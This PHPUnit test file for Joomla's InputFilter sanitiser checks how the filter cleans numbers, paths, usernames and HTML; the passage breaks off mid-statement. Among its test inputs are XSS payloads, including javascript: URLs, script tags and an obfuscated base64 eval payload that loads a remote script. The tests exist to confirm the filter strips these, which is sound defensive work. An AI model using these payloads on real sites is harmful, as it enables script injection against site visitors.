<?php
/**
 * @copyright  Copyright (C) 2005 - 2020 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE
 */

namespace Joomla\Filter\Tests;

use Joomla\Filter\InputFilter;
use Joomla\Filter\Tests\Stubs\ArbitraryObject;
use PHPUnit\Framework\TestCase;

/**
 * Test class for Filter\InputFilter
 *
 * @since  1.0
 */
class InputFilterTest extends TestCase
{
	/**
	 * Produces the array of test cases common to all test runs.
	 *
	 * @return  array  Two dimensional array of test cases. Each row consists of three values
	 *                 The first is the type of input data, the second is the actual input data,
	 *                 the third is the expected result of filtering, and the fourth is
	 *                 the failure message identifying the source of the data.
	 */
	public function casesGeneric()
	{
		$input = '!"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`' .
				 'abcdefghijklmnopqrstuvwxyz{|}~â‚¬â€šÆ’â€žâ€¦â€ â€¡Ë†â€°Å â€¹Å’Å½â€˜â€™â€œâ' .
				 '€�â€¢â€“â€”Ëœâ„¢Å¡â€ºÅ“Å¾Å¸Â¡Â¢Â£Â¤Â¥Â' .
				 '¦Â§Â¨Â©ÂªÂ«Â¬Â­Â®Â¯Â°Â±Â²Â³Â´ÂµÂ¶Â·' .
				 'Â¸Â¹ÂºÂ»Â¼Â½Â¾Â¿Ã€Ã�Ã‚ÃƒÃ„Ã…Ã†Ã‡ÃˆÃ‰ÃŠÃ‹' .
				 'ÃŒÃ�ÃŽÃ�Ã�Ã‘Ã’Ã“Ã”Ã•Ã–Ã—Ã˜Ã™ÃšÃ›ÃœÃ�ÃžÃ' .
				 'ŸÃ Ã¡Ã¢Ã£Ã¤Ã¥Ã¦Ã§Ã¨Ã©ÃªÃ«Ã¬Ã­Ã®Ã¯Ã' .
				 '°Ã±Ã²Ã³Ã´ÃµÃ¶Ã·Ã¸Ã¹ÃºÃ»Ã¼Ã½Ã¾Ã¿';

		return array(
			'int_01'                                                        => array(
				'int',
				$input,
				123456789,
				'From generic cases'
			),
			'integer'                                                       => array(
				'integer',
				$input,
				123456789,
				'From generic cases'
			),
			'int_02'                                                        => array(
				'int',
				'abc123456789abc123456789',
				123456789,
				'From generic cases'
			),
			'int_03'                                                        => array(
				'int',
				'123456789abc123456789abc',
				123456789,
				'From generic cases'
			),
			'int_04'                                                        => array(
				'int',
				'empty',
				0,
				'From generic cases'
			),
			'int_05'                                                        => array(
				'int',
				'ab-123ab',
				-123,
				'From generic cases'
			),
			'int_06'                                                        => array(
				'int',
				'-ab123ab',
				123,
				'From generic cases'
			),
			'int_07'                                                        => array(
				'int',
				'-ab123.456ab',
				123,
				'From generic cases'
			),
			'int_08'                                                        => array(
				'int',
				'456',
				456,
				'From generic cases'
			),
			'int_09'                                                        => array(
				'int',
				'-789',
				-789,
				'From generic cases'
			),
			'int_10'                                                        => array(
				'int',
				-789,
				-789,
				'From generic cases'
			),
			'int_11'                                                        => array(
				'int',
				'',
				0,
				'From generic cases'
			),
			'int_12'                                                        => array(
				'int',
				array(1, 3, 9),
				array(1, 3, 9),
				'From generic cases'
			),
			'int_13'                                                        => array(
				'int',
				array(1, 'ab-123ab', '-ab123.456ab'),
				array(1, -123, 123),
				'From generic cases'
			),
			'uint_1'                                                        => array(
				'uint',
				-789,
				789,
				'From generic cases'
			),
			'uint_2'                                                        => array(
				'uint',
				'',
				0,
				'From generic cases'
			),
			'uint_3'                                                        => array(
				'uint',
				array(-1, -3, -9),
				array(1, 3, 9),
				'From generic cases'
			),
			'uint_4'                                                        => array(
				'uint',
				array(1, 'ab-123ab', '-ab123.456ab'),
				array(1, 123, 123),
				'From generic cases'
			),
			'float_01'                                                      => array(
				'float',
				$input,
				123456789.0,
				'From generic cases'
			),
			'double'                                                        => array(
				'double',
				$input,
				123456789.0,
				'From generic cases'
			),
			'float_02'                                                      => array(
				'float',
				20.20,
				20.2,
				'From generic cases'
			),
			'float_03'                                                      => array(
				'float',
				'-38.123',
				-38.123,
				'From generic cases'
			),
			'float_04'                                                      => array(
				'float',
				'abc-12.456',
				-12.456,
				'From generic cases'
			),
			'float_05'                                                      => array(
				'float',
				'-abc12.456',
				12.456,
				'From generic cases'
			),
			'float_06'                                                      => array(
				'float',
				'abc-12.456abc',
				-12.456,
				'From generic cases'
			),
			'float_07'                                                      => array(
				'float',
				'abc-12 . 456',
				-12.0,
				'From generic cases'
			),
			'float_08'                                                      => array(
				'float',
				'abc-12. 456',
				-12.0,
				'From generic cases'
			),
			'float_09'                                                      => array(
				'float',
				'',
				0.0,
				'From generic cases'
			),
			'float_10'                                                      => array(
				'float',
				'27.3e-34',
				27.3e-34,
				'From generic cases'
			),
			'float_11'                                                      => array(
				'float',
				array(1.0, 3.1, 6.2),
				array(1.0, 3.1, 6.2),
				'From generic cases'
			),
			'float_13'                                                      => array(
				'float',
				array(1.0, 'abc-12. 456', 'abc-12.456abc'),
				array(1.0, -12.0, -12.456),
				'From generic cases'
			),
			'float_14'                                                      => array(
				'float',
				array(1.0, 'abcdef-7E-10', '+27.3E-34', '+27.3e-34'),
				array(1.0, -7E-10, 27.3E-34, 27.3e-34),
				'From generic cases'
			),
			'bool_0'                                                        => array(
				'bool',
				$input,
				true,
				'From generic cases'
			),
			'boolean'                                                       => array(
				'boolean',
				$input,
				true,
				'From generic cases'
			),
			'bool_1'                                                        => array(
				'bool',
				true,
				true,
				'From generic cases'
			),
			'bool_2'                                                        => array(
				'bool',
				false,
				false,
				'From generic cases'
			),
			'bool_3'                                                        => array(
				'bool',
				'',
				false,
				'From generic cases'
			),
			'bool_4'                                                        => array(
				'bool',
				0,
				false,
				'From generic cases'
			),
			'bool_5'                                                        => array(
				'bool',
				1,
				true,
				'From generic cases'
			),
			'bool_6'                                                        => array(
				'bool',
				null,
				false,
				'From generic cases'
			),
			'bool_7'                                                        => array(
				'bool',
				'false',
				true,
				'From generic cases'
			),
			'bool_8'                                                        => array(
				'bool',
				array('false', null, true, false, 1, 0, ''),
				array(true, false, true, false, true, false, false),
				'From generic cases'
			),
			'word_01'                                                       => array(
				'word',
				$input,
				'ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz',
				'From generic cases'
			),
			'word_02'                                                       => array(
				'word',
				null,
				'',
				'From generic cases'
			),
			'word_03'                                                       => array(
				'word',
				123456789,
				'',
				'From generic cases'
			),
			'word_04'                                                       => array(
				'word',
				'word123456789',
				'word',
				'From generic cases'
			),
			'word_05'                                                       => array(
				'word',
				'123456789word',
				'word',
				'From generic cases'
			),
			'word_06'                                                       => array(
				'word',
				'w123o4567r89d',
				'word',
				'From generic cases'
			),
			'word_07'                                                       => array(
				'word',
				array('w123o', '4567r89d'),
				array('wo', 'rd'),
				'From generic cases'
			),
			'alnum_01'                                                      => array(
				'alnum',
				$input,
				'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
				'From generic cases'
			),
			'alnum_02'                                                      => array(
				'alnum',
				null,
				'',
				'From generic cases'
			),
			'alnum_03'                                                      => array(
				'alnum',
				'~!@#$%^&*()_+abc',
				'abc',
				'From generic cases'
			),
			'alnum_04'                                                      => array(
				'alnum',
				array('~!@#$%^abc', '&*()_+def'),
				array('abc', 'def'),
				'From generic cases'
			),
			'cmd_string'                                                    => array(
				'cmd',
				$input,
				'-.0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz',
				'From generic cases'
			),
			'cmd_array'                                                     => array(
				'cmd',
				array($input, $input),
				array(
					'-.0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz',
					'-.0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz'
				),
				'From generic cases'
			),
			'base64_string'                                                 => array(
				'base64',
				$input,
				'+/0123456789=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
				'From generic cases'
			),
			'base64_array'                                                  => array(
				'base64',
				array($input, $input),
				array(
					'+/0123456789=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
					'+/0123456789=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
				),
				'From generic cases'
			),
			'array'                                                         => array(
				'array',
				array(1, 3, 6),
				array(1, 3, 6),
				'From generic cases'
			),
			'relative path'                                                 => array(
				'path',
				'images/system',
				'images/system',
				'From generic cases'
			),
			'path with double separator'                                    => array(
				'path',
				'images//system',
				'images/system',
				'From generic cases'
			),
			'url as path'                                                   => array(
				'path',
				'http://www.fred.com/josephus',
				'',
				'From generic cases'
			),
			'empty path'                                                    => array(
				'path',
				'',
				'',
				'From generic cases'
			),
			'absolute path'                                                 => array(
				'path',
				'/images/system',
				'/images/system',
				'From generic cases'
			),
			'path array'                                                    => array(
				'path',
				array('images/system', '/var/www/html/index.html'),
				array('images/system', '/var/www/html/index.html'),
				'From generic cases'
			),
			'long path'                                                     => array(
				'path',
				'/var/www/html/pub/diplom_labors/2016/2016_Elfimova_O_rpz.pdf',
				'/var/www/html/pub/diplom_labors/2016/2016_Elfimova_O_rpz.pdf',
				'From generic cases'
			),
			'windows path'                                                  => array(
				'path',
				'C:\Documents\Newsletters\Summer2018.pdf',
				'C:\Documents\Newsletters\Summer2018.pdf',
				'From generic cases'
			),
			'windows path lowercase drive letter'                           => array(
				'path',
				'c:\Documents\Newsletters\Summer2018.pdf',
				'c:\Documents\Newsletters\Summer2018.pdf',
				'From generic cases'
			),
			'windows path folder'                                           => array(
				'path',
				'C:\Documents\Newsletters',
				'C:\Documents\Newsletters',
				'From generic cases'
			),
			'windows path with lower case drive letter'                     => array(
				'path',
				'c:\Documents\Newsletters',
				'c:\Documents\Newsletters',
				'From generic cases'
			),
			'windows path with two drive letters'                           => array(
				'path',
				'CC:\Documents\Newsletters',
				'',
				'From generic cases'
			),
			'windows path without drive letter'                             => array(
				'path',
				'Documents\Newsletters',
				'Documents\Newsletters',
				'From generic cases'
			),
			'windows path with double separator'                            => array(
				'path',
				'C:\Documents\Newsletters\\Summer2018.pdf',
				'C:\Documents\Newsletters\Summer2018.pdf',
				'From generic cases'
			),
			'windows path with 2 times double separator'                    => array(
				'path',
				'C:\Documents\\Newsletters\\Summer2018.pdf',
				'C:\Documents\Newsletters\Summer2018.pdf',
				'From generic cases'
			),
			'windows path with 3 times double separator'                    => array(
				'path',
				'C:\\Documents\\Newsletters\\Summer2018.pdf',
				'C:\Documents\Newsletters\Summer2018.pdf',
				'From generic cases'
			),
			'windows path with /'                                           => array(
				'path',
				'C:\\Documents\\Newsletters/tmp',
				'C:\Documents\Newsletters\tmp',
				'From generic cases'
			),
			'windows path with 2 times /'                                   => array(
				'path',
				'C:\\Documents/Newsletters/tmp',
				'C:\Documents\Newsletters\tmp',
				'From generic cases'
			),
			'windows path with 3 times /'                                   => array(
				'path',
				'C:/Documents/Newsletters/tmp',
				'C:\Documents\Newsletters\tmp',
				'From generic cases'
			),
			'non-ascii path'                                                => array(
				'path',
				'εικόνες',
				'εικόνες',
				'From generic cases'
			),
			'symbol path'                                                   => array(
				'path',
				'#+-!$§%&()=,°;<>|',
				'#+-!$§%&()=,°;<>|',
				'From generic cases'
			),
			'abs numeric path'                                              => array(
				'path',
				'/8/86/86753/html/',
				'/8/86/86753/html/',
				'From generic cases'
			),
			'rel numeric path'                                              => array(
				'path',
				'8/86/86753/html/',
				'8/86/86753/html/',
				'From generic cases'
			),
			'user_01'                                                       => array(
				'username',
				'&<f>r%e\'d',
				'fred',
				'From generic cases'
			),
			'user_02'                                                       => array(
				'username',
				'fred',
				'fred',
				'From generic cases'
			),
			'user_03'                                                       => array(
				'username',
				array('&<f>r%e\'d', '$user69'),
				array('fred', '$user69'),
				'From generic cases'
			),
			'user_04'                                                       => array(
				'username',
				'фамилия',
				'фамилия',
				'From generic cases'
			),
			'user_05'                                                       => array(
				'username',
				'Φρεντ',
				'Φρεντ',
				'From generic cases'
			),
			'user_06'                                                       => array(
				'username',
				'محمد',
				'محمد',
				'From generic utf-8 multibyte cases'
			),
			'trim_01'                                                       => array(
				'trim',
				'nonbreaking nonbreaking',
				'nonbreaking nonbreaking',
				'From generic cases'
			),
			'trim_02'                                                       => array(
				'trim',
				'multi　multi',
				'multi　multi',
				'From generic cases'
			),
			'trim_03'                                                       => array(
				'trim',
				array('nonbreaking nonbreaking', 'multi　multi'),
				array('nonbreaking nonbreaking', 'multi　multi'),
				'From generic cases'
			),
			'string_01'                                                     => array(
				'string',
				'123.567',
				'123.567',
				'From generic cases'
			),
			'string_single_quote'                                           => array(
				'string',
				"this is a 'test' of ?",
				"this is a 'test' of ?",
				'From generic cases'
			),
			'string_double_quote'                                           => array(
				'string',
				'this is a "test" of "double" quotes',
				'this is a "test" of "double" quotes',
				'From generic cases'
			),
			'string_odd_double_quote'                                       => array(
				'string',
				'this is a "test of "odd number" of quotes',
				'this is a "test of "odd number" of quotes',
				'From generic cases'
			),
			'string_odd_mixed_quote'                                        => array(
				'string',
				'this is a "test\' of "odd number" of quotes',
				'this is a "test\' of "odd number" of quotes',
				'From generic cases'
			),
			'string_array'                                                  => array(
				'string',
				array('this is a "test\' of "odd number" of quotes', 'executed in an array'),
				array('this is a "test\' of "odd number" of quotes', 'executed in an array'),
				'From generic cases'
			),
			'HTML script tag'                                               => array(
				'raw',
				'<script type="text/javascript">alert("foo");</script>',
				'<script type="text/javascript">alert("foo");</script>',
				'From generic cases'
			),
			'nested HTML tags'                                              => array(
				'raw',
				'<p>This is a test of a html <b>snippet</b></p>',
				'<p>This is a test of a html <b>snippet</b></p>',
				'From generic cases'
			),
			'numeric string'                                                => array(
				'raw',
				'0123456789',
				'0123456789',
				'From generic cases'
			),
			'issue#38'                                                      => array(
				'raw',
				1,
				1,
				'From generic cases'
			),
			'unknown_01'                                                    => array(
				'',
				'123.567',
				'123.567',
				'From generic cases'
			),
			'unknown_02'                                                    => array(
				'',
				array(1, 3, 9),
				array('1', '3', '9'),
				'From generic cases'
			),
			'unknown_03'                                                    => array(
				'',
				array("key" => "Value", "key2" => "This&amp;That"),
				array("key" => "Value", "key2" => "This&That"),
				'From generic cases'
			),
			'unknown_04'                                                    => array(
				'',
				12.6,
				'12.6',
				'From generic cases'
			),
			'tag_01'                                                        => array(
				'',
				'<em',
				'em',
				'From generic cases'
			),
			'Kill script'                                                   => array(
				'',
				'<img src="javascript:alert();" />',
				'<img />',
				'From generic cases'
			),
			'Nested tags'                                                   => array(
				'',
				'<em><strong>Fred</strong></em>',
				'<em><strong>Fred</strong></em>',
				'From generic cases'
			),
			'Nested tags 02'                                                => array(
				'',
				'<em><strong>Φρεντ</strong></em>',
				'<em><strong>Φρεντ</strong></em>',
				'From generic cases'
			),
			'Nested tags with utf-8 multibyte persian characters'           => array(
				'',
				'<em><strong>محمد</strong></em>',
				'<em><strong>محمد</strong></em>',
				'From generic utf-8 multibyte cases'
			),
			'Malformed Nested tags'                                         => array(
				'',
				'<em><strongFred</strong></em>',
				'<em>strongFred</strong></em>',
				'From generic cases'
			),
			'Malformed Nested tags with utf-8 multibyte persian characters' => array(
				'',
				'<em><strongمحمد</strong></em>',
				'<em>strongمحمد</strong></em>',
				'From generic utf-8 multibyte cases'
			),
			'Unquoted Attribute Without Space'                              => array(
				'',
				'<img height=300>',
				'<img height="300" />',
				'From generic cases'
			),
			'Unquoted Attribute'                                            => array(
				'',
				'<img height=300 />',
				'<img height="300" />',
				'From generic cases'
			),
			'Single quoted Attribute'                                       => array(
				'',
				'<img height=\'300\' />',
				'<img height="300" />',
				'From generic cases'
			),
			'Attribute is zero'                                             => array(
				'',
				'<img height=0 />',
				'<img height="0" />',
				'From generic cases'
			),
			'Attribute value missing'                                       => array(
				'',
				'<img height= />',
				'<img height="" />',
				'From generic cases'
			),
			'Attribute without ='                                           => array(
				'',
				'<img height="300" ismap />',
				'<img height="300" />',
				'From generic cases'
			),
			'Bad Attribute Name'                                            => array(
				'',
				'<br 3bb />',
				'<br />',
				'From generic cases'
			),
			'Bad Tag Name'                                                  => array(
				'',
				'<300 />',
				'',
				'From generic cases'
			),
			'tracker9725'                                                   => array(
				'string',
				'<img class="one two" />',
				'<img class="one two" />',
				'Test for recursion with single tags - From generic cases'
			),
			'missing_quote'                                                 => array(
				'string',
				'<img height="123 />',
				'img height="123 /&gt;"',
				'From generic cases'
			),
		);
	}

	/**
	 * Produces the array of test cases for the Clean Text test run.
	 *
	 * @return  array  Two dimensional array of test cases. Each row consists of two values
	 *                 The first is the input data for the test run,
	 *                 and the second is the expected result of filtering.
	 */
	public function casesCleanText()
	{
		$cases = array(
			'case_1'   => array(
				'',
				''
			),
			'script_0' => array(
				'<script>alert(\'hi!\');</script>',
				''
			)
		);
		$tests = $cases;

		return $tests;
	}

	/**
	 * Produces the array of test cases for plain Whitelist test run.
	 *
	 * @return  array  Two dimensional array of test cases. Each row consists of three values
	 *                 The first is the type of input data, the second is the actual input data,
	 *                 the third is the expected result of filtering, and the fourth is
	 *                 the failure message identifying the source of the data.
	 */
	public function whitelist()
	{
		$casesSpecific = array(
			'Kill script'                                                   => array(
				'',
				'<img src="javascript:alert();" />',
				'',
				'From specific cases'
			),
			'Nested tags'                                                   => array(
				'',
				'<em><strong>Fred</strong></em>',
				'Fred',
				'From specific cases'
			),
			'Nested tags 02'                                                => array(
				'',
				'<em><strong>Φρεντ</strong></em>',
				'Φρεντ',
				'From specific cases'
			),
			'Nested tags with utf-8 multibyte persian characters'           => array(
				'',
				'<em><strong>محمد</strong></em>',
				'محمد',
				'From specific utf-8 multibyte cases'
			),
			'Malformed Nested tags'                                         => array(
				'',
				'<em><strongFred</strong></em>',
				'strongFred',
				'From specific cases'
			),
			'Malformed Nested tags with utf-8 multibyte persian characters' => array(
				'',
				'<em><strongمحمد</strong></em>',
				'strongمحمد',
				'From specific utf-8 multibyte cases'
			),
			'Unquoted Attribute Without Space'                              => array(
				'',
				'<img height=300>',
				'',
				'From specific cases'
			),
			'Unquoted Attribute'                                            => array(
				'',
				'<img height=300 />',
				'',
				'From specific cases'
			),
			'Single quoted Attribute'                                       => array(
				'',
				'<img height=\'300\' />',
				'',
				'From specific cases'
			),
			'Attribute is zero'                                             => array(
				'',
				'<img height=0 />',
				'',
				'From specific cases'
			),
			'Attribute value missing'                                       => array(
				'',
				'<img height= />',
				'',
				'From specific cases'
			),
			'Attribute without ='                                           => array(
				'',
				'<img height="300" ismap />',
				'',
				'From specific cases'
			),
			'Bad Attribute Name'                                            => array(
				'',
				'<br 300 />',
				'',
				'From specific cases'
			),
			'tracker9725'                                                   => array(
				// Test for recursion with single tags
				'string',
				'<img class="one two" />',
				'',
				'From specific cases'
			),
			'tracker24258'                                                  => array(
				// Test for recursion on attributes
				'string',
				'<scrip &nbsp; t>alert(\'test\');</scrip t>',
				'alert(\'test\');',
				'From generic cases'
			),
			'Attribute with dash'                                           => array(
				'string',
				'<img data-value="1" />',
				'',
				'From generic cases'
			),
		);
		$tests         = array_merge($this->casesGeneric(), $casesSpecific);

		return $tests;
	}

	/**
	 * Execute a test case on clean() called as member with default filter settings (whitelist - no html).
	 *
	 * @param   string  $type       The type of input
	 * @param   string  $data       The input
	 * @param   string  $expected   The expected result for this test.
	 * @param   string  $caseGroup  The failure message identifying source of test case.
	 *
	 * @return  void
	 *
	 * @dataProvider whitelist
	 */
	public function testCleanByCallingMember($type, $data, $expected, $caseGroup)
	{
		$filter = new InputFilter;
		$actual = $filter->clean($data, $type);

		$message = sprintf(
			"expected: (%s) %s\nactual:   (%s) %s\n(%s)",
			gettype($expected),
			print_r($expected, true),
			gettype($actual),
			print_r($actual, true),
			$caseGroup
		);

		$this->assertSame($expected, $actual, $message);
	}

	/**
	 * Produces the array of test cases for the Whitelist img tag test run.
	 *
	 * @return  array  Two dimensional array of test cases. Each row consists of three values
	 *                 The first is the type of input data, the second is the actual input data,
	 *                 the third is the expected result of filtering, and the fourth is
	 *                 the failure message identifying the source of the data.
	 */
	public function whitelistImg()
	{
		$security20110329bString = "<img src='<img src='/onerror=eval" .
								   "(atob(/KGZ1bmN0aW9uKCl7dHJ5e3ZhciBkPWRvY3VtZW50LGI9ZC5ib2R5LHM9ZC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnNldEF0dHJpYnV0ZSgnc3J" .
								   "jJywnaHR0cDovL2hhLmNrZXJzLm9yZy94c3MuanMnKTtiLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs=/.source))//'/> ";

		$casesSpecific = array(
			'Kill script'                                                   => array(
				'',
				'<img src="javascript:alert();" />',
				'<img />',
				'From specific cases'
			),
			'Nested tags'                                                   => array(
				'',
				'<em><strong>Fred</strong></em>',
				'Fred',
				'From specific cases'
			),
			'Nested tags 02'                                                => array(
				'',
				'<em><strong>Φρεντ</strong></em>',
				'Φρεντ',
				'From specific cases'
			),
			'Nested tags with utf-8 multibyte persian characters'           => array(
				'',
				'<em><strong>محمد</strong></em>',
				'محمد',
				'From specific utf-8 multibyte cases'
			),
			'Malformed Nested tags'                                         => array(
				'',
				'<em><strongFred</strong></em>',
				'strongFred',
				'From specific cases'
			),
			'Malformed Nested tags with utf-8 multibyte persian characters' => array(
				'',
				'<em><strongمحمد</strong></em>',
				'strongمحمد',
				'From specific utf-8 multibyte cases'
			),
			'Unquoted Attribute Without Space'                              => array(
				'',
				'<img height=300>',
				'<img />',
				'From specific cases'
			),
			'Unquoted Attribute'                                            => array(
				'',
				'<img height=300 />',
				'<img />',
				'From specific cases'
			),
			'Single quoted Attribute'                                       => array(
				'',
				'<img height=\'300\' />',
				'<img />',
				'From specific cases'
			),
			'Attribute is zero'                                             => array(
				'',
				'<img height=0 />',
				'<img />',
				'From specific cases'
			),
			'Attribute value missing'                                       => array(
				'',
				'<img height= />',
				'<img />',
				'From specific cases'
			),
			'Attribute without ='                                           => array(
				'',
				'<img height="300" ismap />',
				'<img />',
				'From specific cases'
			),
			'Bad Attribute Name'                                            => array(
				'',
				'<br 300 />',
				'',
				'From specific cases'
			),
			'tracker9725'                                                   => array(
				// Test for recursion with single tags
				'string',
				'<img class="one two" />',
				'<img />',
				'From specific cases'
			),
			'security_20110329a'                                            => array(
				'string',
				"<img src='<img src='///'/> ",
				'<img /> ',
				'From specific cases'
			),
			'security_20110329b'                                            => array(
				'string',
				$security20110329bString,
				'<img /> ',
				'From specific cases'
			),
			'hanging_quote'                                                 => array(
				'string',
				"<img src=\' />",
				'<img />',
				'From specific cases'
			),
			'hanging_quote2'                                                => array(
				'string',
				'<img src slkdjls " this is "more " stuff',
				'img src slkdjls " this is "more " stuff',
				'From specific cases'
			),
			'hanging_quote3'                                                => array(
				'string',
				"<img src=\"\'\" />",
				'<img />',
				'From specific cases'
			),
			'Attribute with dash'                                           => array(
				'string',
				'<img data-value="1" />',
				'<img />',
				'From generic cases'
			),
		);
		$tests         = array_merge($this->casesGeneric(), $casesSpecific);

		return $tests;
	}

	/**
	 * Execute a test case on clean() called as member with custom filter settings (whitelist).
	 *
	 * @param   string  $type     The type of input
	 * @param   string  $data     The input
	 * @param   string  $expect   The expected result for this test.
	 * @param   string  $message  The failure message identifying the source of the test case.
	 *
	 * @return  void
	 *
	 * @dataProvider whitelistImg
	 */
	public function testCleanWithImgWhitelisted($type, $data, $expect, $message)
	{
		$filter = new InputFilter(array('img'), null, 0, 0);
		$this->assertThat(
			$filter->clean($data, $type),
			$this->equalTo($expect),
			$message
		);
	}

	/**
	 * Produces the array of test cases for the Whitelist class attribute test run.
	 *
	 * @return  array  Two dimensional array of test cases. Each row consists of three values
	 *                 The first is the type of input data, the second is the actual input data,
	 *                 the third is the expected result of filtering, and the fourth is
	 *                 the failure message identifying the source of the data.
	 */
	public function whitelistClass()
	{
		$casesSpecific = array(
			'Kill script'                                                   => array(
				'',
				'<img src="javascript:alert();" />',
				'',
				'From specific cases'
			),
			'Nested tags'                                                   => array(
				'',
				'<em><strong>Fred</strong></em>',
				'Fred',
				'From specific cases'
			),
			'Nested tags 02'                                                => array(
				'',
				'<em><strong>Φρεντ</strong></em>',
				'Φρεντ',
				'From specific cases'
			),
			'Nested tags with utf-8 multibyte persian characters'           => array(
				'',
				'<em><strong>محمد</strong></em>',
				'محمد',
				'From specific utf-8 multibyte cases'
			),
			'Malformed Nested tags'                                         => array(
				'',
				'<em><strongFred</strong></em>',
				'strongFred',
				'From specific cases'
			),
			'Malformed Nested tags with utf-8 multibyte persian characters' => array(
				'',
				'<em><strongمحمد</strong></em>',
				'strongمحمد',
				'From specific utf-8 multibyte cases'
			),
			'Unquoted Attribute Without Space'                              => array(
				'',
				'<img height=300>',
				'',
				'From specific cases'
			),
			'Unquoted Attribute'                                            => array(
				'',
				'<img height=300 />',
				'',
				'From specific cases'
			),
			'Single quoted Attribute'                                       => array(
				'',
				'<img height=\'300\' />',
				'',
				'From specific cases'
			),
			'Attribute is zero'                                             => array(
				'',
				'<img height=0 />',
				'',
				'From specific cases'
			),
			'Attribute value missing'                                       => array(
				'',
				'<img height= />',
				'',
				'From specific cases'
			),
			'Attribute without ='                                           => array(
				'',
				'<img height="300" ismap />',
				'',
				'From specific cases'
			),
			'Bad Attribute Name'                                            => array(
				'',
				'<br 300 />',
				'',
				'From specific cases'
			),
			'tracker9725'                                                   => array(
				// Test for recursion with single tags
				'string',
				'<img class="one two" />',
				'',
				'From specific cases'
			),
			'Attribute with dash'                                           => array(
				'string',
				'<img data-value="1" />',
				'',
				'From generic cases'
			),
		);
		$tests         = array_merge($this->casesGeneric(), $casesSpecific);

		return $tests;
	}

	/**
	 * Execute a test case on clean() called as member with custom filter settings (whitelist).
	 *
	 * @param   string  $type     The type of input
	 * @param   string  $data     The input
	 * @param   string  $expect   The expected result for this test.
	 * @param   string  $message  The failure message identifying the source of the test case.
	 *
	 * @return  void
	 *
	 * @dataProvider whitelistClass
	 */
	public function testCleanWithClassWhitelisted($type, $data, $expect, $message)
	{
		$filter = new InputFilter(null, array('class'), 0, 0);
		$this->assertThat(
			$filter->clean($data, $type),
			$this->equalTo($expect),
			$message
		);
	}

	/**
	 * Produces the array of test cases for the Whitelist class attribute img tag test run.
	 *
	 * @return  array  Two dimensional array of test cases. Each row consists of three values
	 *                 The first is the type of input data, the second is the actual input data,
	 *                 the third is the expected result of filtering, and the fourth is
	 *                 the failure message identifying the source of the data.
	 */
	public function whitelistClassImg()
	{
		$casesSpecific = array(
			'Kill script'                                                   => array(
				'',
				'<img src="javascript:alert();" />',
				'<img />',
				'From specific cases'
			),
			'Nested tags'                                                   => array(
				'',
				'<em><strong>Fred</strong></em>',
				'Fred',
				'From specific cases'
			),
			'Nested tags 02'                                                => array(
				'',
				'<em><strong>Φρεντ</strong></em>',
				'Φρεντ',
				'From specific cases'
			),
			'Nested tags with utf-8 multibyte persian characters'           => array(
				'',
				'<em><strong>محمد</strong></em>',
				'محمد',
				'From specific utf-8 multibyte cases'
			),
			'Malformed Nested tags'                                         => array(
				'',
				'<em><strongFred</strong></em>',
				'strongFred',
				'From specific cases'
			),
			'Malformed Nested tags with utf-8 multibyte persian characters' => array(
				'',
				'<em><strongمحمد</strong></em>',
				'strongمحمد',
				'From specific utf-8 multibyte cases'
			),
			'Unquoted Attribute Without Space'                              => array(
				'',
				'<img class=myclass height=300 >',
				'<img class="myclass" />',
				'From specific cases'
			),
			'Unquoted Attribute'                                            => array(
				'',
				'<img class = myclass  height = 300/>',
				'<img />',
				'From specific cases'
			),
			'Single quoted Attribute'                                       => array(
				'',
				'<img class=\'myclass\' height=\'300\' />',
				'<img class="myclass" />',
				'From specific cases'
			),
			'Attribute is zero'                                             => array(
				'',
				'<img class=0 height=0 />',
				'<img class="0" />',
				'From specific cases'
			),
			'Attribute value missing'                                       => array(
				'',
				'<img class= height= />',
				'<img class="" />',
				'From specific cases'
			),
			'Attribute without ='                                           => array(
				'',
				'<img ismap class />',
				'<img />',
				'From specific cases'
			),
			'Bad Attribute Name'                                            => array(
				'',
				'<br 300 />',
				'',
				'From specific cases'
			),
			'tracker9725'                                                   => array(
				// Test for recursion with single tags
				'string',
				'<img class="one two" />',
				'<img class="one two" />',
				'From specific cases'
			),
			'class with no ='                                               => array(
				// Test for recursion with single tags
				'string',
				'<img class />',
				'<img />',
				'From specific cases'
			),
			'Attribute with dash'                                           => array(
				'string',
				'<img data-value="1" />',
				'<img />',
				'From generic cases'
			),
		);
		$tests         = array_merge($this->casesGeneric(), $casesSpecific);

		return $tests;
	}

	/**
	 * Execute a test case on clean() called as member with custom filter settings (whitelist).
	 *
	 * @param   string  $type     The type of input
	 * @param   string  $data     The input
	 * @param   string  $expect   The expected result for this test.
	 * @param   string  $message  The failure message identifying the source of the test case.
	 *
	 * @return  void
	 *
	 * @dataProvider whitelistClassImg
	 */
	public function testCleanWithImgAndClassWhitelisted($type, $data, $expect, $message)
	{
		$filter = new InputFilter(array('img'), array('class'), 0, 0);
		$this->assertThat(
			$filter->clean($data, $type),
			$this->equalTo($expect),
			$message
		);
	}

	/**
	 * Produces the array of test cases for the plain Blacklist test run.
	 *
	 * @return  array  Two dimensional array of test cases. Each row consists of three values
	 *                 The first is the type of input data, the second is the actual input data,
	 *                 the third is the expected result of filtering, and the fourth is
	 *                 the failure message identifying the source of the data.
	 */
	public function blacklist()
	{
		$quotesInText1 = '<p class="my_class">This is a = "test" ' .
						 '<a href="http://mysite.com" img="my_image">link test</a>. This is some more text.</p>';
		$quotesInText2 = '<p class="my_class">This is a = "test" ' .
						 '<a href="http://mysite.com" img="my_image">link test</a>. This is some more text.</p>';
		$normalNested1 = '<p class="my_class">This is a <a href="http://mysite.com" img = "my_image">link test</a>.' .
